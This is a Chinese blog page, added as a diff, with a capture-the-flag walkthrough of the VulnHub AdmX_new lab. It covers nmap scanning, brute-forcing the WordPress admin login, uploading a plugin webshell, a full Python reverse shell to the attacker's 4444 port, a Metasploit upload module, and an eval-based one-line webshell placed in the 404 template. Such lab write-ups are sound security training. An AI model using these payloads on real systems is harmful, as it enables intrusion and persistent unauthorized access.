@@ -1,0 +1,1642 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="打靶AdmX_new, 网络安全 漏洞挖掘 CTF">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
+    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
+    <meta name="description" content="
+靶机地址：https://download.vulnhub.com/admx/AdmX_new.7z
+
+总体介绍背景​    无
+目标​    取得root权限和2个flag
+难度​    medium
+对该靶机进行的攻击方法及工具
+端口">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>打靶AdmX_new | pluto 小站</title>
+    <link rel="icon" type="image/png" href="http://pic.charo.xyz/blog/202111051410579.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?ce84511d3df71640a9378a69f6293044";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+    <script>
+        (function(){
+        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
+        document.write('<script src="' + src + '" id="sozz"><\/script>');
+        })();
+    </script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="http://pic.charo.xyz/blog/202111051411200.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">pluto 小站</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags/" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories/" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives/" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about/" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends/" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact/" class="waves-effect waves-light">
+            
+            <i class="fa fa-comments"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="http://pic.charo.xyz/blog/202111051411200.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">pluto 小站</div>
+        <div class="logo-desc">
+            
+            西安石油大学 | 网络工程 | src
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-comments"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/xifandanta/xifandanta.github.io.git" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/xifandanta/xifandanta.github.io.git" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('http://pic.charo.xyz/blog/31.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        打靶AdmX_new
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/博客/" target="_blank">
+                            <span class="chip bg-color">博客</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/靶机：AdmX-new/" class="post-category" target="_blank">
+                            靶机：AdmX_new
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-10
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    slh
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z" target="_blank" rel="noopener">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
+</blockquote>
+<h3 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​    无</p>
+<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>​    取得root权限和2个flag</p>
+<h4 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h4><p>​    medium</p>
+<h4 id="对该靶机进行的攻击方法及工具"><a href="#对该靶机进行的攻击方法及工具" class="headerlink" title="对该靶机进行的攻击方法及工具"></a>对该靶机进行的攻击方法及工具</h4><ul>
+<li>端口扫描/主机发现</li>
+<li>web信息搜集</li>
+<li><em>BurpSuite</em>自动替换</li>
+<li>密码爆破</li>
+<li>MSF漏洞利用</li>
+<li><em>Wordpress</em>漏洞利用</li>
+<li>反弹shell升级（可以自动补齐）</li>
+<li>获取第二个反弹shell（蚁剑）</li>
+<li>MySQL提权</li>
+<li>另类提权方法</li>
+<li><em>BurpSuite</em>，<em>蚁剑</em>，<em>feroxbuster</em></li>
+</ul>
+<h3 id="让我们开始吧"><a href="#让我们开始吧" class="headerlink" title="让我们开始吧"></a>让我们开始吧</h3><h4 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h4><p>​    在安装完靶机后发现了靶机无法获取ip地址的问题，在这里简单的说一下解决办法</p>
+<ul>
+<li><h5 id="使用VirtualBox虚拟机"><a href="#使用VirtualBox虚拟机" class="headerlink" title="使用VirtualBox虚拟机"></a>使用VirtualBox虚拟机</h5><ul>
+<li>这个靶机的作者更于推荐我们使用VirtualBox虚拟机，有时候发生这种情况是虚拟机配置问题，所以我们更该一下虚拟机就能解决。</li>
+</ul>
+</li>
+<li><h5 id="使用单用户模式修改网络配置"><a href="#使用单用户模式修改网络配置" class="headerlink" title="使用单用户模式修改网络配置"></a>使用单用户模式修改网络配置</h5><ul>
+<li><p>如果更换后没有解决，很有可能是网络配置原因，在这里简单说一下</p>
+</li>
+<li><p>在靶机启动后无法获得IP地址，首先将虚拟机重启，并在重启的黑屏阶段<strong>按住</strong>方向键盘的<strong>向上键</strong>，这样就会调出系统的启动菜单（有可能要重复多次），你就会看到如下界面：<img src="http://pic.charo.xyz/blog/202110101449499.png" alt></p>
+</li>
+<li><p>这时单击键盘中的字母“e”，修改内核加载中的配置，进行修改</p>
+<ul>
+<li>修改前<img src="http://pic.charo.xyz/blog/202110101503595.png" alt></li>
+<li>修改后<img src="http://pic.charo.xyz/blog/202110101506789.png" alt></li>
+</ul>
+</li>
+<li><p>然后按<code>Ctrl + x</code>进入单用户模式即root模式，使用<code>ip a</code>命令查看当前网卡设备名称知道它时<code>enp0s17</code><img src="http://pic.charo.xyz/blog/202110101509339.png" alt></p>
+</li>
+<li><p>查看网络配置文件中的网卡名称</p>
+<pre class="line-numbers language-shell"><code class="language-shell"># RedHat
+vi /etc/network/interfaces
+
+# UBUNTU
+vi /etc/netplan/00-installer-config.yaml
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>将配置文件中的网卡名称修改为当前的正确名称，并确定DHCP启动<img src="http://pic.charo.xyz/blog/202110101515180.png" alt></p>
+</li>
+<li><p>保存修改，重启即可成功，接下来就可以愉快的打靶了</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>​    今天我们使用nmap进行主机发现，这个工具非常强大。</p>
+<p>​    使用命令<code>sudo nmap -sn 10.0.2.0/24</code>进行主机扫描，很快扫描完成结果如下：（10.0.2.15是我自己的kali主机）得到靶机ip地址：<em>10.0.2.8</em></p>
+<p><img src="http://pic.charo.xyz/blog/202110101528440.png" alt></p>
+<p>​    使用命令<code>sudo nmap -p- 10.0.2.8</code>对靶机端口进行扫描，这次扫描时间很久，大概用了两分钟时间才扫描结束。扫描结果只得到了一个80端口，不出意外它应该是一个http的服务。</p>
+<p><img src="http://pic.charo.xyz/blog/202110101533989.png" alt></p>
+<p>​    我们使用命令<code>sudo nmap -p80 -sV 10.0.2.8</code>对它进行服务的发现，得到如下结果</p>
+<p><img src="http://pic.charo.xyz/blog/202110101536209.png" alt></p>
+<p>​    果然是一个web页面。</p>
+<h4 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h4><p>​    通过访问<em>10.0.2.8:80</em>我们可以看到它时<em>Apache</em>的起始页面，在这个页面中我们没有发现有用的信息。<img src="http://pic.charo.xyz/blog/202110101539246.png" alt></p>
+<p>​    接下来我们就要进行一项常规操作，对目标八级web隐藏目录进行发现，先前我们使用的是<em>dirsearch</em>这款工具，今天我们使用另一款工具<em>feroxbuster</em>，往往使用不同的工具它会有不用的结果，我们可以使用不同的工具，对得到的结果进行分析。</p>
+<p>​    使用命令<code>feroxbuster --url http://10.0.2.8</code>进行查看，但如果直接使用的话可能会报错，原因是它默认需要一个字典叫做<em>seclists</em>，我们可以使用命令<code>sudo apt install seclists</code> 进行安装。但是这个字典太大了，我们可以对它进行指定字典扫描。</p>
+<p>使用命令</p>
+<pre class="line-numbers language-shell"><code class="language-shell">sudo feroxbuster --url http://10.0.2.8 -w /usr/share/dirb/wordlists/common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>让它使用指定字典进行扫描，在扫描过程中我们发现了一些现象</p>
+<p><img src="http://pic.charo.xyz/blog/202110101559604.png" alt></p>
+<p>我们发现大量结果都指向<em>wordpress</em>路径，而且它返回结果是301，表示重定向，我们对它进行访问，包括它底下的标志性admin目录。我访问了<code>http://10.0.2.8/wordpress/</code>和<code>10.0.2.8/wordpress/admin</code>。我们在访问中发现，加载速度非常缓慢，而且加载不完全</p>
+<p>​    <img src="http://pic.charo.xyz/blog/202110101606236.png" alt></p>
+<p>这种时候我们就要使用<em>BurpSuite</em>工具来查看一下是哪些元素使它加载缓慢。</p>
+<p>我们首先关闭BP的截断功能然后刷新一下页面。然后我们进入BP的HTTPhistory页面，得到结果：</p>
+<p><img src="http://pic.charo.xyz/blog/202110101611869.png" alt></p>
+<p>我们发现当我们访问靶机10.0.2.8时它请求了ip为192.168.159.145下的三个不同资源，我们在结果中搜索192.168.159.145，我们发现它是被硬编码写入的，因此我们没有办法访问到一些资源</p>
+<p><img src="http://pic.charo.xyz/blog/202110101617964.png" alt></p>
+<p>发现这个问题后，我们点击<code>Proxy --&gt; Options</code>，拉到下面，<code>Match and Replace</code>中，先取消所有已存在内容，然后手动添加以下内容：</p>
+<p><img src="http://pic.charo.xyz/blog/202110101622261.png" alt></p>
+<p><img src="http://pic.charo.xyz/blog/202110121605746.png" alt></p>
+<p>修改完成过后我们回到浏览器页面再次刷新，发现这回速度很快，而且获取到了资源</p>
+<p><img src="http://pic.charo.xyz/blog/202110121606828.png" alt></p>
+<p>但是高兴太早了，经过我的一番测试，并没有在该页面和链接处发现明显的漏洞，于是我回到了之前的隐藏目录，发现了这样一个路径<code>http://10.0.2.8/wordpress/wp-admin</code>似乎是后台登陆页面。</p>
+<p><img src="http://pic.charo.xyz/blog/202110101630804.png" alt></p>
+<p>看到这个界面，我的思路就不受约束的指向了密码暴力破解。</p>
+<h4 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h4><p>我们首先搜索了Wordpress CMS，得知它的默认管理员账号是admin，由此我们可以进行密码爆破</p>
+<p>首先选择字典我选择的是<em>SuperWordlist</em>下的<em>MidPwds</em></p>
+<p>接下来开启BP的拦截功能，然后提交一个错误的密码，让BP截获，然后发给intruder，我们只选择密码的字段，将它添加为数据注入点</p>
+<p><img src="http://pic.charo.xyz/blog/202110101642910.png" alt></p>
+<p>然后在<code>Payloads</code>中选择如下</p>
+<p><img src="http://pic.charo.xyz/blog/202110101645486.png" alt></p>
+<p>然后进行attack。</p>
+<p>经过漫长的等待，最终拿到了，得到它的密码是adam14，</p>
+<p><img src="http://pic.charo.xyz/blog/202110101826624.png" alt></p>
+<p>我们登陆后得到如下界面：</p>
+<p><img src="http://pic.charo.xyz/blog/202110101903692.png" alt></p>
+<p>那接下来的任务就是通过<em>Wordpress</em>的漏洞获得shell</p>
+<h4 id="Wordpress漏洞利用"><a href="#Wordpress漏洞利用" class="headerlink" title="Wordpress漏洞利用"></a><em>Wordpress</em>漏洞利用</h4><p>总体来说<em>Wordpress</em>有三种利用漏洞的方法</p>
+<ul>
+<li><p><strong>通过Media-&gt;Add New上传shell文件</strong><img src="http://pic.charo.xyz/blog/202110101909402.png" alt></p>
+<p>​    很遗憾，在这里无法利用此漏洞</p>
+</li>
+<li><p><strong>通过点击Appearance-&gt;Theme Editor，修改主题,嵌入代码</strong></p>
+<ul>
+<li><p>在这里最经常使用的是404模板来进行代码注入例如<em>蚁剑的一句话代码</em></p>
+<p>​    <code>&lt;?php eval($_POST[&#39;ant&#39;]);?&gt;</code><img src="http://pic.charo.xyz/blog/202110101918587.png" alt></p>
+<p>​    很遗憾我们在保存的过程中发生了错误<img src="http://pic.charo.xyz/blog/202110101919004.png" alt></p>
+</li>
+</ul>
+</li>
+<li><p><strong>自己写一个插件,增加到服务器中（<em>Plugins-&gt;Add New-&gt;Upload Plugin</em>）</strong></p>
+<ul>
+<li>收现在kali编写插件 shell.php（必须包含头部信息，否则无法识别）<img src="http://pic.charo.xyz/blog/202110101929132.png" alt></li>
+<li>要注意压缩成zip格式的文件才能上传，使用命令<code>zip shell.zip shell.php</code>进行压缩<img src="http://pic.charo.xyz/blog/202110101933884.png" alt></li>
+<li>接下去进行上传，注意要记得激活插件<img src="http://pic.charo.xyz/blog/202110101934249.png" alt></li>
+<li>它的存储路径在<code>10.0.2.8/wordpress/wp-content/plugins/shell.php</code>我们可以在它之后加上id命令来查看是否成功，上句末尾加上<code>?cmd=id</code>进行查看<img src="http://pic.charo.xyz/blog/202110121606565.png" alt></li>
+</ul>
+<p>至此Wordpress漏洞利用成功，我们接下来就要拿到反弹shell。</p>
+</li>
+</ul>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>​    我们可以查看一下，靶机是否存在python，如果存在我们可以很方便的进行反弹，我们在末尾输入<code>which python</code> <code>which python2</code> <code>which python3</code>,我们发现只有python3这个版本是存在的。<img src="http://pic.charo.xyz/blog/202110101946082.png" alt></p>
+<p>​    因此我们可以执行python反弹shell，首先在kali本机侦听4444端口然后在浏览器末尾加上代码</p>
+<pre class="line-numbers language-python"><code class="language-python">python3 <span class="token operator">-</span>c '<span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.0.2.15"</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> pty<span class="token punctuation">;</span>
+pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="http://pic.charo.xyz/blog/202110121607576.png" alt></p>
+<p>成功获得反弹shell。</p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>​    通过MSF利用Wordpress的漏洞来获取shell。</p>
+<p>​    使用命令<code>sudo msfdb run</code>来启动msf，并通过命令<code>search wordpress admin</code>来获取wordpress后来相关的漏洞。我们得到了这样一个漏洞，通过后台admin来进行上传。</p>
+<p><img src="http://pic.charo.xyz/blog/202110102144893.png" alt></p>
+<p>​    使用命令<code>use 2</code>和<code>show options</code>来查看一下这个模块需要我们设置什么选项。<img src="http://pic.charo.xyz/blog/202110102147931.png" alt></p>
+<p>​    通过查看我们可知要修改PASSWORD,RHOSTS,TARGETURI,和USERNAME，因此我们做出如下修改，在输入run运行。<img src="http://pic.charo.xyz/blog/202110102154974.png" alt></p>
+<p>​    然后我们就得到了<em>meterpreter</em>在输入<em>shell</em>即可获得权限</p>
+<p><img src="http://pic.charo.xyz/blog/202110102158579.png" alt></p>
+<p>​    但是这种方式获得shell有一定的缺陷，比如<code>pwd</code>和<code>ls</code>无法正常使用，英雌我们还是使用第一种方法获得的shell。</p>
+<h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><h5 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h5><p>​    在这一部分，需要达到的目的是获取多个shell，因为在真实的渗透环境中,我们往往会遇到很多不确定因素，比如一个漏洞只有在第一次触发的时候有效，再次触发就无效了！或者因为网络等原因，某个shell突然就掉了。这样的话会浪费很多的时间去重新拿到shell，因此，我们在拿到一个shell之后，就要先想办法获取第二个甚至第三个shell，来稳定获得的权限。</p>
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>​    我们可以通过修改先前的404模板，用蚁剑的一句话<em>webshell</em>，来获得另一个shell。</p>
+<h5 id="实现一"><a href="#实现一" class="headerlink" title="实现一"></a>实现一</h5><p>​    我们使用命令<code>cd wp-content/themes/twentytwentyone</code>进入主题目录，并编辑404.php文件<img src="http://pic.charo.xyz/blog/202110102213276.png" alt></p>
+<p>​    这时候我们将会发现一个非常严重的问题，首先在这个状态下没有办法自动补齐，其次，在编辑404.php文件时，无法使用方向键，即在与靶机文件进行交互时还有比较严重的问题<img src="http://pic.charo.xyz/blog/202110102216953.png" alt></p>
+<p>​    基于此，我们需要升级我们的webshell，让它变为可交互的shell。</p>
+<h5 id="webshell升级"><a href="#webshell升级" class="headerlink" title="webshell升级"></a><em>webshell</em>升级</h5><p>​    注意：升级成Full TTY Shell只是用于bash，如果你使用的也是Kali Linux,那么在此之前,可能需要先把zsh切换为bash。</p>
+<p>​    由于我使用的是zsh，所以我输入命令<code>echo $SHELL</code> 来查看当前shell类型，使用命令<code>chsh -s /bin/bash</code>来转换shell，并重启。(注意不要加sudo)<img src="http://pic.charo.xyz/blog/202110102223180.png" alt></p>
+<p>​        重启之后，我们现在已经是bash类型，我们再把虚拟机调整到先前状态。</p>
+<p>调整好之后，我们作如下步骤：</p>
+<ol>
+<li><p>输入<code>Ctrl+Z</code>将已经获取的webshell保存到后台。</p>
+</li>
+<li><p>输入<code>stty raw -echo</code></p>
+</li>
+<li><p>输入<code>fg</code>调取刚才保存的shell，注意fg把那个不会显示。</p>
+</li>
+<li><p>输入<code>export SHELL=/bin/bash</code></p>
+</li>
+<li><p>输入<code>export TERM=screen</code></p>
+</li>
+<li><p>输入<code>stty rows 38 columns 126</code>设置终端大小38行126列</p>
+</li>
+<li><p>输入<code>reset</code> </p>
+<p>至此升级成功，已经可以自动补齐且可进行交互。</p>
+</li>
+</ol>
+<h5 id="实现二"><a href="#实现二" class="headerlink" title="实现二"></a>实现二</h5><p>​    我们现在在来编辑404.php文件，加入蚁剑一句话代码。</p>
+<p>​    <img src="http://pic.charo.xyz/blog/202110102259201.png" alt></p>
+<p>​    我们启动蚁剑，添加数据，测试链接，成功后点击添加</p>
+<p><img src="http://pic.charo.xyz/blog/202110102313649.png" alt></p>
+<p>​    </p>
+<p>​    添加完成后，打开它的终端，成功，我们获得第二个shell</p>
+<p><img src="http://pic.charo.xyz/blog/202110102316121.png" alt></p>
